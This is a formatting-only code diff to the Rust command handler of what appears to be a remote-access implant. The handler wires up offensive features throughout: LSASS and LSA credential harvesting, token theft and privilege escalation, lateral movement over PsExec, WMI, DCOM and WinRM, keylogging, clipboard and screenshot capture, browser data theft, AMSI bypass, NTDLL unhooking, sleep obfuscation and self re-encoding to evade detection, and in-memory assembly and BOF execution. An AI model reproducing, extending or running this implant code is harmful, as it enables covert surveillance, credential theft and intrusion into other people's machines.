@@ -10,13 +10,7 @@
 
 use base64::Engine;
 use common::{
-    config::Config,
-    AuditEvent,
-    Command,
-    CryptoSession,
-    Message,
-    NetDiscoveryOp,
-    Outcome,
+    config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome,
 };
 use lazy_static::lazy_static;
 use module_loader::LoadedPlugin;
@@ -180,15 +174,9 @@ fn sanitize_result(cmd: &Command, result: &Result<String, String>) -> String {
         (Command::CaptureScreen, Ok(b64)) => {
             format!("[screenshot redacted, {} base64 bytes]", b64.len())
         }
-        (Command::Screenshot { .. }, Ok(msg)) => {
-            msg.clone()
-        }
-        (Command::KeyloggerDump { .. }, Ok(msg)) => {
-            msg.clone()
-        }
-        (Command::ClipboardMonitorDump { .. }, Ok(msg)) => {
-            msg.clone()
-        }
+        (Command::Screenshot { .. }, Ok(msg)) => msg.clone(),
+        (Command::KeyloggerDump { .. }, Ok(msg)) => msg.clone(),
+        (Command::ClipboardMonitorDump { .. }, Ok(msg)) => msg.clone(),
         (_, Ok(s)) => s.clone(),
         (_, Err(e)) => e.clone(),
     }
@@ -230,17 +218,14 @@ pub(crate) fn push_module(
                 .duration_since(std::time::UNIX_EPOCH)
                 .unwrap_or_default()
                 .as_secs();
-            LOADED_PLUGINS
-                .lock()
-                .unwrap()
-                .insert(
-                    module_name.clone(),
-                    LoadedPlugin {
-                        plugin: Arc::new(plugin),
-                        metadata,
-                        load_timestamp,
-                    },
-                );
+            LOADED_PLUGINS.lock().unwrap().insert(
+                module_name.clone(),
+                LoadedPlugin {
+                    plugin: Arc::new(plugin),
+                    metadata,
+                    load_timestamp,
+                },
+            );
             Ok(format!("Module '{}' loaded via push", module_name))
         }
         Err(e) => Err(e.to_string()),
@@ -320,53 +305,57 @@ pub async fn handle_command(
         Command::NetworkDiscovery { ref operation } => {
             use std::net::IpAddr;
             match operation {
-                NetDiscoveryOp::ArpScan => {
-                    match super::net_discovery::arp_scan() {
-                        Ok(hosts) => serde_json::to_string(&hosts)
-                            .map_err(|e| e.to_string()),
-                        Err(e) => Err(e),
-                    }
-                }
-                NetDiscoveryOp::PingSweep { subnet, timeout_ms, max_concurrent } => {
+                NetDiscoveryOp::ArpScan => match super::net_discovery::arp_scan() {
+                    Ok(hosts) => serde_json::to_string(&hosts).map_err(|e| e.to_string()),
+                    Err(e) => Err(e),
+                },
+                NetDiscoveryOp::PingSweep {
+                    subnet,
+                    timeout_ms,
+                    max_concurrent,
+                } => {
                     match super::net_discovery::ping_sweep(
                         subnet,
                         Duration::from_millis(*timeout_ms),
                         *max_concurrent,
-                    ).await {
-                        Ok(hosts) => serde_json::to_string(&hosts)
-                            .map_err(|e| e.to_string()),
+                    )
+                    .await
+                    {
+                        Ok(hosts) => serde_json::to_string(&hosts).map_err(|e| e.to_string()),
                         Err(e) => Err(e),
                     }
                 }
-                NetDiscoveryOp::TcpPortScan { host, ports, concurrency, timeout_ms } => {
-                    match host.parse::<IpAddr>() {
-                        Ok(ip) => match super::net_discovery::tcp_port_scan(
-                            ip,
-                            ports,
-                            *concurrency,
-                            Duration::from_millis(*timeout_ms),
-                        ).await {
-                            Ok(open_ports) => serde_json::to_string(&open_ports)
-                                .map_err(|e| e.to_string()),
-                            Err(e) => Err(e),
-                        },
-                        Err(e) => Err(format!("invalid IP address '{}': {}", host, e)),
-                    }
-                }
-                NetDiscoveryOp::ReverseDns { ip } => {
-                    match ip.parse::<IpAddr>() {
-                        Ok(addr) => match super::net_discovery::reverse_dns_lookup(addr) {
-                            Ok(hostname) => serde_json::to_string(&hostname)
-                                .map_err(|e| e.to_string()),
-                            Err(e) => Err(e),
-                        },
-                        Err(e) => Err(format!("invalid IP address '{}': {}", ip, e)),
-                    }
-                }
+                NetDiscoveryOp::TcpPortScan {
+                    host,
+                    ports,
+                    concurrency,
+                    timeout_ms,
+                } => match host.parse::<IpAddr>() {
+                    Ok(ip) => match super::net_discovery::tcp_port_scan(
+                        ip,
+                        ports,
+                        *concurrency,
+                        Duration::from_millis(*timeout_ms),
+                    )
+                    .await
+                    {
+                        Ok(open_ports) => {
+                            serde_json::to_string(&open_ports).map_err(|e| e.to_string())
+                        }
+                        Err(e) => Err(e),
+                    },
+                    Err(e) => Err(format!("invalid IP address '{}': {}", host, e)),
+                },
+                NetDiscoveryOp::ReverseDns { ip } => match ip.parse::<IpAddr>() {
+                    Ok(addr) => match super::net_discovery::reverse_dns_lookup(addr) {
+                        Ok(hostname) => serde_json::to_string(&hostname).map_err(|e| e.to_string()),
+                        Err(e) => Err(e),
+                    },
+                    Err(e) => Err(format!("invalid IP address '{}': {}", ip, e)),
+                },
                 NetDiscoveryOp::AdSrvDiscovery { domain } => {
                     match super::net_discovery::ad_srv_discovery(domain) {
-                        Ok(records) => serde_json::to_string(&records)
-                            .map_err(|e| e.to_string()),
+                        Ok(records) => serde_json::to_string(&records).map_err(|e| e.to_string()),
                         Err(e) => Err(e),
                     }
                 }
@@ -434,26 +423,27 @@ pub async fn handle_command(
                 let path_str = path.to_string_lossy().into_owned();
                 match fsops::read_file(&path_str, &cfg).await {
                     Err(e) => Err(format!("Failed to read module blob: {e}")),
-                    Ok(blob) => match module_loader::load_plugin(&blob, &crypto, cfg.module_verify_key.as_deref()) {
+                    Ok(blob) => match module_loader::load_plugin(
+                        &blob,
+                        &crypto,
+                        cfg.module_verify_key.as_deref(),
+                    ) {
                         Ok(plugin) => {
-                            let metadata = plugin
-                                .get_metadata()
-                                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(module_id));
+                            let metadata = plugin.get_metadata().unwrap_or_else(|| {
+                                module_loader::PluginMetadata::default_for(module_id)
+                            });
                             let load_timestamp = std::time::SystemTime::now()
                                 .duration_since(std::time::UNIX_EPOCH)
                                 .unwrap_or_default()
                                 .as_secs();
-                            LOADED_PLUGINS
-                                .lock()
-                                .unwrap()
-                                .insert(
-                                    module_id.clone(),
-                                    LoadedPlugin {
-                                        plugin: Arc::new(plugin),
-                                        metadata,
-                                        load_timestamp,
-                                    },
-                                );
+                            LOADED_PLUGINS.lock().unwrap().insert(
+                                module_id.clone(),
+                                LoadedPlugin {
+                                    plugin: Arc::new(plugin),
+                                    metadata,
+                                    load_timestamp,
+                                },
+                            );
                             Ok("Module deployed".to_string())
                         }
                         Err(e) => Err(e.to_string()),
@@ -536,53 +526,45 @@ pub async fn handle_command(
             Ok(format!("Re-encode seed set to {seed:#018x}"))
         }
         #[cfg(not(feature = "self-reencode"))]
-        Command::SetReencodeSeed { .. } => {
-            Err("self-reencode feature not enabled".to_string())
-        }
+        Command::SetReencodeSeed { .. } => Err("self-reencode feature not enabled".to_string()),
 
         /// MorphNow: immediately re-encode .text with the supplied seed and
         /// return the SHA-256 hash of the resulting .text section.
         #[cfg(feature = "self-reencode")]
-        Command::MorphNow { seed } => {
-            match crate::self_reencode::morph_now(seed) {
-                Ok(hash) => {
-                    log::info!("MorphNow completed: .text hash = {hash}");
-                    Ok(hash)
-                }
-                Err(e) => {
-                    log::error!("MorphNow failed: {e:#}");
-                    Err(format!("MorphNow failed: {e:#}"))
-                }
+        Command::MorphNow { seed } => match crate::self_reencode::morph_now(seed) {
+            Ok(hash) => {
+                log::info!("MorphNow completed: .text hash = {hash}");
+                Ok(hash)
             }
-        }
+            Err(e) => {
+                log::error!("MorphNow failed: {e:#}");
+                Err(format!("MorphNow failed: {e:#}"))
+            }
+        },
         #[cfg(not(feature = "self-reencode"))]
-        Command::MorphNow { .. } => {
-            Err("self-reencode feature not enabled".to_string())
-        }
+        Command::MorphNow { .. } => Err("self-reencode feature not enabled".to_string()),
 
         // SetSleepVariant: switch the sleep obfuscation variant at runtime.
         // Accepted values: "cronus", "ekko".
         #[cfg(windows)]
-        Command::SetSleepVariant { ref variant } => {
-            match variant.to_lowercase().as_str() {
-                "cronus" => {
-                    crate::sleep_obfuscation::set_sleep_variant(
-                        crate::sleep_obfuscation::SleepVariant::Cronus,
-                    );
-                    Ok(format!("Sleep variant set to {variant}"))
-                }
-                "ekko" => {
-                    crate::sleep_obfuscation::set_sleep_variant(
-                        crate::sleep_obfuscation::SleepVariant::Ekko,
-                    );
-                    Ok(format!("Sleep variant set to {variant}"))
-                }
-                other => {
-                    log::warn!("unknown sleep variant '{other}', ignoring");
-                    Err(format!("unknown sleep variant: {other}"))
-                }
+        Command::SetSleepVariant { ref variant } => match variant.to_lowercase().as_str() {
+            "cronus" => {
+                crate::sleep_obfuscation::set_sleep_variant(
+                    crate::sleep_obfuscation::SleepVariant::Cronus,
+                );
+                Ok(format!("Sleep variant set to {variant}"))
             }
-        }
+            "ekko" => {
+                crate::sleep_obfuscation::set_sleep_variant(
+                    crate::sleep_obfuscation::SleepVariant::Ekko,
+                );
+                Ok(format!("Sleep variant set to {variant}"))
+            }
+            other => {
+                log::warn!("unknown sleep variant '{other}', ignoring");
+                Err(format!("unknown sleep variant: {other}"))
+            }
+        },
         #[cfg(not(windows))]
         Command::SetSleepVariant { .. } => {
             Err("sleep obfuscation variant switching is only supported on Windows".to_string())
@@ -603,7 +585,6 @@ pub async fn handle_command(
         Command::DisablePersistence => Err("persistence feature not enabled".to_string()),
 
         // ── Plugin Framework commands ──
-
         Command::ListPlugins => {
             let plugins = LOADED_PLUGINS.lock().unwrap();
             let meta_list: Vec<_> = plugins.values().map(|lp| &lp.metadata).collect();
@@ -624,9 +605,7 @@ pub async fn handle_command(
         Command::GetPluginInfo { ref plugin_id } => {
             let plugins = LOADED_PLUGINS.lock().unwrap();
             match plugins.get(plugin_id) {
-                Some(lp) => {
-                    serde_json::to_string(&lp.metadata).map_err(|e| e.to_string())
-                }
+                Some(lp) => serde_json::to_string(&lp.metadata).map_err(|e| e.to_string()),
                 None => Err(format!("Plugin '{plugin_id}' not loaded")),
             }
         }
@@ -708,9 +687,9 @@ pub async fn handle_command(
                             Err(e) => Err(format!("Module load failed: {e}")),
                         }
                     }
-                    Err(_) => {
-                        Err(format!("ModuleRequest for '{module_id}' cancelled — channel closed"))
-                    }
+                    Err(_) => Err(format!(
+                        "ModuleRequest for '{module_id}' cancelled — channel closed"
+                    )),
                 }
             }
         }
@@ -724,16 +703,14 @@ pub async fn handle_command(
                 plugins.get(plugin_id).map(|lp| lp.plugin.clone())
             };
             match maybe_plugin {
-                Some(plugin) => {
-                    match (**plugin).execute_binary(input_data) {
-                        Ok(output) => {
-                            let len = output.len();
-                            result_data = Some(output);
-                            Ok(format!("Binary result: {} bytes", len))
-                        }
-                        Err(e) => Err(e.to_string()),
+                Some(plugin) => match (**plugin).execute_binary(input_data) {
+                    Ok(output) => {
+                        let len = output.len();
+                        result_data = Some(output);
+                        Ok(format!("Binary result: {} bytes", len))
                     }
-                }
+                    Err(e) => Err(e.to_string()),
+                },
                 None => Err(format!("Plugin '{plugin_id}' not loaded")),
             }
         }
@@ -760,43 +737,42 @@ pub async fn handle_command(
         }
 
         // ── Token Manipulation (Windows only) ─────────────────────────
-
         #[cfg(windows)]
-        Command::MakeToken { ref username, ref password, ref domain, logon_type } => {
-            super::token_manipulation::make_token(username, password, domain, logon_type)
-                .map_err(|e| e.to_string())
-        }
+        Command::MakeToken {
+            ref username,
+            ref password,
+            ref domain,
+            logon_type,
+        } => super::token_manipulation::make_token(username, password, domain, logon_type)
+            .map_err(|e| e.to_string()),
         #[cfg(not(windows))]
         Command::MakeToken { .. } => Err("token manipulation requires Windows".to_string()),
 
         #[cfg(windows)]
         Command::StealToken { target_pid } => {
-            super::token_manipulation::steal_token(target_pid)
-                .map_err(|e| e.to_string())
+            super::token_manipulation::steal_token(target_pid).map_err(|e| e.to_string())
         }
         #[cfg(not(windows))]
         Command::StealToken { .. } => Err("token manipulation requires Windows".to_string()),
 
         #[cfg(windows)]
-        Command::Rev2Self => {
-            super::token_manipulation::rev2self()
-                .map_err(|e| e.to_string())
-        }
+        Command::Rev2Self => super::token_manipulation::rev2self().map_err(|e| e.to_string()),
         #[cfg(not(windows))]
         Command::Rev2Self => Err("token manipulation requires Windows".to_string()),
 
         #[cfg(windows)]
-        Command::GetSystem => {
-            super::token_manipulation::get_system()
-                .map_err(|e| e.to_string())
-        }
+        Command::GetSystem => super::token_manipulation::get_system().map_err(|e| e.to_string()),
         #[cfg(not(windows))]
         Command::GetSystem => Err("token manipulation requires Windows".to_string()),
 
         // ── Lateral Movement (Windows only) ───────────────────────────
-
         #[cfg(windows)]
-        Command::PsExec { ref target_host, ref command, ref username, ref password } => {
+        Command::PsExec {
+            ref target_host,
+            ref command,
+            ref username,
+            ref password,
+        } => {
             let user = username.as_deref();
             let pass = password.as_deref();
             super::lateral_movement::psexec_exec(target_host, command, user, pass)
@@ -806,7 +782,12 @@ pub async fn handle_command(
         Command::PsExec { .. } => Err("lateral movement requires Windows".to_string()),
 
         #[cfg(windows)]
-        Command::WmiExec { ref target_host, ref command, ref username, ref password } => {
+        Command::WmiExec {
+            ref target_host,
+            ref command,
+            ref username,
+            ref password,
+        } => {
             let user = username.as_deref();
             let pass = password.as_deref();
             super::lateral_movement::wmi_exec(target_host, command, user, pass)
@@ -816,7 +797,12 @@ pub async fn handle_command(
         Command::WmiExec { .. } => Err("lateral movement requires Windows".to_string()),
 
         #[cfg(windows)]
-        Command::DcomExec { ref target_host, ref command, ref username, ref password } => {
+        Command::DcomExec {
+            ref target_host,
+            ref command,
+            ref username,
+            ref password,
+        } => {
             let user = username.as_deref();
             let pass = password.as_deref();
             super::lateral_movement::dcom_exec(target_host, command, user, pass)
@@ -826,25 +812,33 @@ pub async fn handle_command(
         Command::DcomExec { .. } => Err("lateral movement requires Windows".to_string()),
 
         #[cfg(windows)]
-        Command::WinRmExec { ref target_host, ref command, ref username, ref password } => {
+        Command::WinRmExec {
+            ref target_host,
+            ref command,
+            ref username,
+            ref password,
+        } => {
             let user = username.as_deref();
             let pass = password.as_deref();
-            super::lateral_movement::winrm_exec(target_host, command, user, pass).await
+            super::lateral_movement::winrm_exec(target_host, command, user, pass)
+                .await
                 .map_err(|e| e.to_string())
         }
         #[cfg(not(windows))]
         Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),
 
         // ── P2P mesh management ────────────────────────────────────────
-        Command::LinkAgents { ref target_addr, ref transport, .. } => {
+        Command::LinkAgents {
+            ref target_addr,
+            ref transport,
+            ..
+        } => {
             let mesh_arc = p2p_mesh.clone();
             let mut mesh_guard = mesh_arc.lock().await;
-            match mesh_guard.connect_to_parent(
-                target_addr,
-                transport,
-                out_tx.clone(),
-                p2p_mesh.clone(),
-            ).await {
+            match mesh_guard
+                .connect_to_parent(target_addr, transport, out_tx.clone(), p2p_mesh.clone())
+                .await
+            {
                 Ok(link_id) => Ok(format!(
                     "LinkAgents: linked to {} via {}, link_id={:#010X}",
                     target_addr, transport, link_id
@@ -869,15 +863,16 @@ pub async fn handle_command(
         }
 
         // ── Agent-side P2P link commands ───────────────────────────────
-        Command::LinkTo { ref parent_addr, ref transport } => {
+        Command::LinkTo {
+            ref parent_addr,
+            ref transport,
+        } => {
             let mesh_arc = p2p_mesh.clone();
             let mut mesh_guard = mesh_arc.lock().await;
-            match mesh_guard.connect_to_parent(
-                parent_addr,
-                transport,
-                out_tx.clone(),
-                p2p_mesh.clone(),
-            ).await {
+            match mesh_guard
+                .connect_to_parent(parent_addr, transport, out_tx.clone(), p2p_mesh.clone())
+                .await
+            {
                 Ok(link_id) => Ok(format!(
                     "connected to parent at {} via {}, link_id={:#010X}",
                     parent_addr, transport, link_id
@@ -899,15 +894,17 @@ pub async fn handle_command(
         }
 
         // ── Mesh routing commands ──────────────────────────────────────
-        Command::MeshConnect { ref target_agent_id, ref transport, ref target_addr } => {
+        Command::MeshConnect {
+            ref target_agent_id,
+            ref transport,
+            ref target_addr,
+        } => {
             let mesh_arc = p2p_mesh.clone();
             let mut mesh_guard = mesh_arc.lock().await;
-            match mesh_guard.connect_to_parent(
-                target_addr,
-                transport,
-                out_tx.clone(),
-                p2p_mesh.clone(),
-            ).await {
+            match mesh_guard
+                .connect_to_parent(target_addr, transport, out_tx.clone(), p2p_mesh.clone())
+                .await
+            {
                 Ok(link_id) => {
                     // Record the peer agent_id on the new link.
                     if let Some(link) = mesh_guard.links.get_mut(&link_id) {
@@ -921,13 +918,18 @@ pub async fn handle_command(
                 Err(e) => Err(format!("MeshConnect failed: {e}")),
             }
         }
-        Command::MeshDisconnect { ref target_agent_id } => {
+        Command::MeshDisconnect {
+            ref target_agent_id,
+        } => {
             let mut mesh_guard = p2p_mesh.lock().await;
             let link_id = mesh_guard.link_id_by_peer(target_agent_id);
             match link_id {
                 Some(id) => match mesh_guard.disconnect(Some(id)).await {
                     0 => Err("no links to disconnect".to_string()),
-                    n => Ok(format!("mesh disconnected {} ({n} link(s))", target_agent_id)),
+                    n => Ok(format!(
+                        "mesh disconnected {} ({n} link(s))",
+                        target_agent_id
+                    )),
                 },
                 None => Err(format!("no link to agent '{}'", target_agent_id)),
             }
@@ -937,17 +939,28 @@ pub async fn handle_command(
             mesh_guard.activate_kill_switch();
             Ok("mesh kill switch activated: all links terminated".to_string())
         }
-        Command::MeshQuarantine { ref target_agent_id, reason } => {
+        Command::MeshQuarantine {
+            ref target_agent_id,
+            reason,
+        } => {
             let mut mesh_guard = p2p_mesh.lock().await;
             match mesh_guard.quarantine_peer(target_agent_id, reason) {
-                Ok(()) => Ok(format!("agent '{}' quarantined (reason={})", target_agent_id, reason)),
+                Ok(()) => Ok(format!(
+                    "agent '{}' quarantined (reason={})",
+                    target_agent_id, reason
+                )),
                 Err(e) => Err(format!("MeshQuarantine failed: {e}")),
             }
         }
-        Command::MeshClearQuarantine { ref target_agent_id } => {
+        Command::MeshClearQuarantine {
+            ref target_agent_id,
+        } => {
             let mut mesh_guard = p2p_mesh.lock().await;
             match mesh_guard.clear_quarantine(target_agent_id) {
-                Ok(()) => Ok(format!("quarantine cleared for agent '{}'", target_agent_id)),
+                Ok(()) => Ok(format!(
+                    "quarantine cleared for agent '{}'",
+                    target_agent_id
+                )),
                 Err(e) => Err(format!("MeshClearQuarantine failed: {e}")),
             }
         }
@@ -959,24 +972,26 @@ pub async fn handle_command(
 
         // ── In-process .NET assembly execution (Windows only) ───────────
         #[cfg(windows)]
-        Command::ExecuteAssembly { ref data, ref args, timeout_secs } => {
-            match unsafe { super::assembly_loader::execute(data, args, timeout_secs) } {
-                Ok(result) => {
-                    let output_len = result.output.len();
-                    result_data = Some(result.output.into_bytes());
-                    let hr_display = if result.hresult as u32 == 0 {
-                        "S_OK".to_string()
-                    } else {
-                        format!("{:#010X}", result.hresult as u32)
-                    };
-                    Ok(format!(
-                        "assembly executed ({} bytes output, HRESULT={})",
-                        output_len, hr_display
-                    ))
-                }
-                Err(e) => Err(format!("execute-assembly failed: {e}")),
+        Command::ExecuteAssembly {
+            ref data,
+            ref args,
+            timeout_secs,
+        } => match unsafe { super::assembly_loader::execute(data, args, timeout_secs) } {
+            Ok(result) => {
+                let output_len = result.output.len();
+                result_data = Some(result.output.into_bytes());
+                let hr_display = if result.hresult as u32 == 0 {
+                    "S_OK".to_string()
+                } else {
+                    format!("{:#010X}", result.hresult as u32)
+                };
+                Ok(format!(
+                    "assembly executed ({} bytes output, HRESULT={})",
+                    output_len, hr_display
+                ))
             }
-        }
+            Err(e) => Err(format!("execute-assembly failed: {e}")),
+        },
         #[cfg(not(windows))]
         Command::ExecuteAssembly { .. } => {
             Err("execute-assembly requires Windows (.NET CLR hosting)".to_string())
@@ -984,16 +999,18 @@ pub async fn handle_command(
 
         // ── BOF / COFF loader (Windows only) ────────────────────────────
         #[cfg(windows)]
-        Command::ExecuteBOF { ref data, ref args, timeout_secs } => {
-            match unsafe { super::coff_loader::execute_bof(data, args, timeout_secs) } {
-                Ok(result) => {
-                    let output_len = result.output.len();
-                    result_data = Some(result.output.into_bytes());
-                    Ok(format!("BOF executed ({} bytes output)", output_len))
-                }
-                Err(e) => Err(format!("execute-bof failed: {e}")),
+        Command::ExecuteBOF {
+            ref data,
+            ref args,
+            timeout_secs,
+        } => match unsafe { super::coff_loader::execute_bof(data, args, timeout_secs) } {
+            Ok(result) => {
+                let output_len = result.output.len();
+                result_data = Some(result.output.into_bytes());
+                Ok(format!("BOF executed ({} bytes output)", output_len))
             }
-        }
+            Err(e) => Err(format!("execute-bof failed: {e}")),
+        },
         #[cfg(not(windows))]
         Command::ExecuteBOF { .. } => {
             Err("execute-bof requires Windows (COFF object files)".to_string())
@@ -1006,47 +1023,43 @@ pub async fn handle_command(
                 Err(e) => Err(format!("create-shell failed: {e}")),
             }
         }
-        Command::ShellInput { session_id, ref data } => {
-            match crate::interactive_shell::send_input(session_id, data) {
-                Ok(()) => Ok(format!("input sent to session {session_id}")),
-                Err(e) => Err(format!("shell-input failed: {e}")),
-            }
-        }
+        Command::ShellInput {
+            session_id,
+            ref data,
+        } => match crate::interactive_shell::send_input(session_id, data) {
+            Ok(()) => Ok(format!("input sent to session {session_id}")),
+            Err(e) => Err(format!("shell-input failed: {e}")),
+        },
         Command::ShellClose { session_id } => {
             match crate::interactive_shell::close_shell(session_id) {
                 Ok(msg) => Ok(msg),
                 Err(e) => Err(format!("shell-close failed: {e}")),
             }
         }
-        Command::ShellList => {
-            match crate::interactive_shell::list_shells() {
-                Ok(list) => Ok(serde_json::to_string(&list).unwrap_or_default()),
-                Err(e) => Err(format!("shell-list failed: {e}")),
-            }
-        }
-        Command::ShellResize { session_id, cols, rows } => {
-            match crate::interactive_shell::resize_shell(session_id, cols, rows) {
-                Ok(msg) => Ok(msg),
-                Err(e) => Err(format!("shell-resize failed: {e}")),
-            }
-        }
+        Command::ShellList => match crate::interactive_shell::list_shells() {
+            Ok(list) => Ok(serde_json::to_string(&list).unwrap_or_default()),
+            Err(e) => Err(format!("shell-list failed: {e}")),
+        },
+        Command::ShellResize {
+            session_id,
+            cols,
+            rows,
+        } => match crate::interactive_shell::resize_shell(session_id, cols, rows) {
+            Ok(msg) => Ok(msg),
+            Err(e) => Err(format!("shell-resize failed: {e}")),
+        },
 
         // ── Surveillance commands ─────────────────────────────────────
-
         #[cfg(feature = "surveillance")]
-        Command::Screenshot { monitor } => {
-            match crate::surveillance::capture_screenshot(monitor) {
-                Ok(png_bytes) => {
-                    result_data = Some(png_bytes);
-                    Ok("screenshot captured".to_string())
-                }
-                Err(e) => Err(format!("screenshot failed: {e}")),
+        Command::Screenshot { monitor } => match crate::surveillance::capture_screenshot(monitor) {
+            Ok(png_bytes) => {
+                result_data = Some(png_bytes);
+                Ok("screenshot captured".to_string())
             }
-        }
+            Err(e) => Err(format!("screenshot failed: {e}")),
+        },
         #[cfg(not(feature = "surveillance"))]
-        Command::Screenshot { .. } => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::Screenshot { .. } => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
         Command::KeyloggerStart => {
@@ -1057,9 +1070,7 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(feature = "surveillance"))]
-        Command::KeyloggerStart => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::KeyloggerStart => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
         Command::KeyloggerDump { clear } => {
@@ -1073,21 +1084,15 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(feature = "surveillance"))]
-        Command::KeyloggerDump { .. } => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::KeyloggerDump { .. } => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
-        Command::KeyloggerStop => {
-            match crate::surveillance::stop_keylogger() {
-                Ok(()) => Ok("keylogger stopped".to_string()),
-                Err(e) => Err(format!("keylogger stop failed: {e}")),
-            }
-        }
+        Command::KeyloggerStop => match crate::surveillance::stop_keylogger() {
+            Ok(()) => Ok("keylogger stopped".to_string()),
+            Err(e) => Err(format!("keylogger stop failed: {e}")),
+        },
         #[cfg(not(feature = "surveillance"))]
-        Command::KeyloggerStop => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::KeyloggerStop => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
         Command::ClipboardMonitorStart { interval_ms } => {
@@ -1114,38 +1119,30 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(feature = "surveillance"))]
-        Command::ClipboardMonitorDump { .. } => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::ClipboardMonitorDump { .. } => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
-        Command::ClipboardMonitorStop => {
-            match crate::surveillance::stop_clipboard_monitor() {
-                Ok(()) => Ok("clipboard monitor stopped".to_string()),
-                Err(e) => Err(format!("clipboard monitor stop failed: {e}")),
-            }
-        }
+        Command::ClipboardMonitorStop => match crate::surveillance::stop_clipboard_monitor() {
+            Ok(()) => Ok("clipboard monitor stopped".to_string()),
+            Err(e) => Err(format!("clipboard monitor stop failed: {e}")),
+        },
         #[cfg(not(feature = "surveillance"))]
-        Command::ClipboardMonitorStop => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::ClipboardMonitorStop => Err("surveillance feature not enabled".to_string()),
 
         #[cfg(feature = "surveillance")]
-        Command::ClipboardGet => {
-            match crate::surveillance::get_clipboard() {
-                Ok(text) => Ok(text),
-                Err(e) => Err(format!("clipboard get failed: {e}")),
-            }
-        }
+        Command::ClipboardGet => match crate::surveillance::get_clipboard() {
+            Ok(text) => Ok(text),
+            Err(e) => Err(format!("clipboard get failed: {e}")),
+        },
         #[cfg(not(feature = "surveillance"))]
-        Command::ClipboardGet => {
-            Err("surveillance feature not enabled".to_string())
-        }
+        Command::ClipboardGet => Err("surveillance feature not enabled".to_string()),
 
         // ── Browser data recovery ─────────────────────────────────────
-
         #[cfg(all(windows, feature = "browser-data"))]
-        Command::BrowserData { ref browser, ref data_type } => {
+        Command::BrowserData {
+            ref browser,
+            ref data_type,
+        } => {
             // Set C4 timeout from config before calling browser_data.
             {
                 let cfg = config.lock().await;
@@ -1165,24 +1162,18 @@ pub async fn handle_command(
         }
 
         // ── LSASS credential harvesting (Windows only) ──────────────────
-
         #[cfg(windows)]
-        Command::HarvestLSASS => {
-            match crate::lsass_harvest::harvest_lsass() {
-                Ok(json) => {
-                    result_data = Some(json.into_bytes());
-                    Ok("lsass harvest completed".to_string())
-                }
-                Err(e) => Err(format!("lsass harvest failed: {e}")),
+        Command::HarvestLSASS => match crate::lsass_harvest::harvest_lsass() {
+            Ok(json) => {
+                result_data = Some(json.into_bytes());
+                Ok("lsass harvest completed".to_string())
             }
-        }
+            Err(e) => Err(format!("lsass harvest failed: {e}")),
+        },
         #[cfg(not(windows))]
-        Command::HarvestLSASS => {
-            Err("LSASS harvesting requires Windows".to_string())
-        }
+        Command::HarvestLSASS => Err("LSASS harvesting requires Windows".to_string()),
 
         // ── LSA Whisperer — SSP interface credential extraction ────────
-
         #[cfg(all(windows, feature = "lsa-whisperer"))]
         Command::HarvestLSA { ref method } => {
             let timeout = config.lock().await.lsa_whisperer.timeout_secs;
@@ -1200,55 +1191,45 @@ pub async fn handle_command(
         }
 
         #[cfg(all(windows, feature = "lsa-whisperer"))]
-        Command::LSAWhispererStatus => {
-            match crate::lsa_whisperer::whisperer_status() {
-                Ok(json) => {
-                    result_data = Some(json.into_bytes());
-                    Ok("lsa whisperer status".to_string())
-                }
-                Err(e) => Err(format!("lsa whisperer status failed: {e}")),
+        Command::LSAWhispererStatus => match crate::lsa_whisperer::whisperer_status() {
+            Ok(json) => {
+                result_data = Some(json.into_bytes());
+                Ok("lsa whisperer status".to_string())
             }
-        }
+            Err(e) => Err(format!("lsa whisperer status failed: {e}")),
+        },
         #[cfg(not(all(windows, feature = "lsa-whisperer")))]
         Command::LSAWhispererStatus => {
             Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
         }
 
         #[cfg(all(windows, feature = "lsa-whisperer"))]
-        Command::LSAWhispererStop => {
-            match crate::lsa_whisperer::whisperer_stop() {
-                Ok(msg) => Ok(msg),
-                Err(e) => Err(format!("lsa whisperer stop failed: {e}")),
-            }
-        }
+        Command::LSAWhispererStop => match crate::lsa_whisperer::whisperer_stop() {
+            Ok(msg) => Ok(msg),
+            Err(e) => Err(format!("lsa whisperer stop failed: {e}")),
+        },
         #[cfg(not(all(windows, feature = "lsa-whisperer")))]
         Command::LSAWhispererStop => {
             Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
         }
 
         // ── NTDLL unhooking (Windows only) ──────────────────────────────
-
         #[cfg(windows)]
-        Command::UnhookNtdll => {
-            match crate::ntdll_unhook::unhook_ntdll() {
-                Ok(result) => {
-                    let json = serde_json::to_string(&result).unwrap_or_default();
-                    result_data = Some(json.into_bytes());
-                    Ok(format!(
-                        "ntdll unhooked via {} ({} stubs re-resolved)",
-                        result.method, result.stubs_re_resolved,
-                    ))
-                }
-                Err(e) => Err(format!("ntdll unhook failed: {e}")),
+        Command::UnhookNtdll => match crate::ntdll_unhook::unhook_ntdll() {
+            Ok(result) => {
+                let json = serde_json::to_string(&result).unwrap_or_default();
+                result_data = Some(json.into_bytes());
+                Ok(format!(
+                    "ntdll unhooked via {} ({} stubs re-resolved)",
+                    result.method, result.stubs_re_resolved,
+                ))
             }
-        }
+            Err(e) => Err(format!("ntdll unhook failed: {e}")),
+        },
         #[cfg(not(windows))]
-        Command::UnhookNtdll => {
-            Err("NTDLL unhooking requires Windows".to_string())
-        }
+        Command::UnhookNtdll => Err("NTDLL unhooking requires Windows".to_string()),
 
         // ── AMSI bypass mode selection ─────────────────────────────────
-
         #[cfg(windows)]
         Command::AmsiBypassMode { ref mode } => {
             use common::AmsiBypassMode as Mode;
@@ -1270,7 +1251,10 @@ pub async fn handle_command(
                     }
